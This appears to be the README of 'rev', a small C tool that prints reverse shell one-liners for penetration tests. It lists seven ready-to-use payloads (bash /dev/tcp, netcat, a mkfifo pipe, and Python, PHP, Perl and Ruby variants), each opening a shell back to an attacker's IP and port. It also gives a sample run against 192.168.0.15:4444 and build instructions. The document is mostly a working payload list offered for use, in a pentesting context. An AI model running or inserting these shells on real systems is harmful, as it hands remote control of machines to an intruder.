# rev
Simple reverse shell one liner generator for quick pentest engagements.

## Usage

```
▶ ./rev

Usage: [IP ADDRESS] [PORT] [NUMBER OF PAYLOAD]

Payload list:
1. bash -i >& /dev/tcp/xx.x.x.x/xxxx 0>&1
2. nc -e /bin/bash xx.x.x.x xxxx
3. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.x.x.x xxxx >/tmp/f
4. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK...
5. php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
6. perl -e 'use Socket;$i="xx.x.x.x";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname...
7. ruby -rsocket -e'f=TCPSocket.open("xx.x.x.x",xxxx).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```

```
▶ ./rev 192.168.0.15 4444 3

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.15 4444 >/tmp/f
```

You can pipe it to xclip to copy:

```
./rev 192.168.0.15 4444 3 | xclip -selection clipboard
```
## Compile

Compile it yourself or use pre-compiled binary from releases section.

```
gcc rev.c -o rev
```
